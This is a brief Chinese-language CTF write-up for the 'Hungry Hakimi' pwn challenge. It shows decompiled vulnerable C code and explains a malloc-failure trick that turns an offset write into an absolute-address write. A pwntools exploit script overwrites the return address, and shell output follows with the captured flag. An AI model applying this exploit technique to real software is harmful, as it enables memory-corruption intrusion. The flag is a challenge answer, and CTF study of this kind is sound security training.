# 饥饿哈基米

```c
int64_t   offset;           // [rsp+8h ]    [rbp-18h]
uint64_t  size;             // [rsp+10h]    [rbp-10h]
char      *p;               // [rsp+18h]    [rbp-8h ]

read(0, &size, 8u);
printf("%p", &offset);      // address of 'offset'
p = malloc(size);
read(0, &offset, 8u);
read(0, &p[offset], 8u);
```

利用 `malloc` 失败，即传入极大的参数从而返回空指针，把写入目标变成绝对地址。

```python
io.recvuntil(b"\n")
io.recvuntil(b"\n")
io.send(b"\xff" * 8)

io.recvuntil(b"gift: 0x")
offset = int(io.recv(12), 16)

padding = 0x18
io.sendafter(b"??\n", flat(offset + padding + 0x8))
io.sendafter(b"???\n", flat(elf.symbols["dininghall"]))
```

```bash
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x37 bytes:
    b'bin\n'
    b'dev\n'
    b'flag\n'
    b'hungry_cat\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'libexec\n'
    b'libx32\n'
bin
dev
flag
hungry_cat
lib
lib32
lib64
libexec
libx32
$ cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x2d bytes:
    b'NSSCTF{276bc5ec-af33-4504-8391-0104dd5ddc6a}\n'
NSSCTF{276bc5ec-af33-4504-8391-0104dd5ddc6a}
$  
```

Flag 为 `NSSCTF{276bc5ec-af33-4504-8391-0104dd5ddc6a}` 。